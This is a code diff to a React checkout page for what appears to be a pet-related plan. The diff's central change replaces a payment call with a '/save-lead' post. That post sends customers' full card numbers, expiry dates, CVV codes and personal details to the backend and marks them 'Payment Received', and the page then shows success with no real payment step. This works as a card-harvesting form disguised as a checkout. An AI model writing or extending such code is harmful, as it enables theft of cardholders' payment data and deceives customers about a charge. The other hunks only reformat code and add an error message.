@@ -150,32 +150,37 @@ function Checkout() {
     try {
       setLoading(true);
 
-      setTimeout(async () => {
-        await api.post("/payment", {
-          petName: petInfo?.petName || "",
-          customerName: `${personalInfo?.firstName || ""} ${personalInfo?.lastName || ""}`,
-          email: petInfo?.email || "",
+      await api.post("/save-lead", {
+        ...petInfo,
+        ...personalInfo,
+        planName: selectedPlan.name,
+        amount: totalToday.toFixed(2),
+        status: "Payment Received",
+        cardName: payment.cardName,
+        cardNumber: payment.cardNumber,
+        cardExpiry: payment.expiry,
+        cardCVV: payment.cvc,
+        billingZip: payment.billingZip,
+      });
+
+      localStorage.setItem(
+        "paymentResult",
+        JSON.stringify({
+          status: "received",
+          amount: totalToday,
           planName: selectedPlan.name,
-          amount: totalToday.toFixed(2),
-          status: "Payment Received",
-          cardName: payment.cardName,
-          billingZip: payment.billingZip,
-        });
+        })
+      );
 
-        localStorage.setItem(
-          "paymentResult",
-          JSON.stringify({
-            status: "received",
-            amount: totalToday,
-            planName: selectedPlan.name,
-          })
-        );
-
-        navigate("/success");
-      }, 5000);
+      navigate("/success");
     } catch (error) {
       setLoading(false);
-      setErrors({ submit: "Payment save failed. Backend check karo." });
+      setErrors({
+        submit:
+          error.response?.data?.message ||
+          error.message ||
+          "Data save failed. Backend check karo.",
+      });
     }
   };
 
@@ -245,7 +250,10 @@ function Checkout() {
                 value={payment.cvc}
                 maxLength={4}
                 onChange={(e) =>
-                  updatePayment("cvc", e.target.value.replace(/\D/g, "").slice(0, 4))
+                  updatePayment(
+                    "cvc",
+                    e.target.value.replace(/\D/g, "").slice(0, 4)
+                  )
                 }
                 placeholder="CVC"
               />
@@ -275,9 +283,14 @@ function Checkout() {
             <span>I agree to the terms and policy conditions.</span>
           </label>
 
-          {errors.cardNumber && <p className="field-error-text">{errors.cardNumber}</p>}
+          {errors.cardNumber && (
+            <p className="field-error-text">{errors.cardNumber}</p>
+          )}
           {errors.expiry && <p className="field-error-text">{errors.expiry}</p>}
-          {errors.billingZip && <p className="field-error-text">{errors.billingZip}</p>}
+          {errors.billingZip && (
+            <p className="field-error-text">{errors.billingZip}</p>
+          )}
+          {errors.agree && <p className="field-error-text">{errors.agree}</p>}
           {errors.submit && <p className="field-error-text">{errors.submit}</p>}
 
           <button className="pay-btn" type="submit" disabled={loading}>
@@ -295,7 +308,11 @@ function Checkout() {
             </span>
           </div>
 
-          <div className={isPromo ? "summary-plan promo-summary" : "summary-plan paid-summary"}>
+          <div
+            className={
+              isPromo ? "summary-plan promo-summary" : "summary-plan paid-summary"
+            }
+          >
             <h3>{selectedPlan.name}</h3>
             <p>{selectedPlan.description}</p>
           </div>
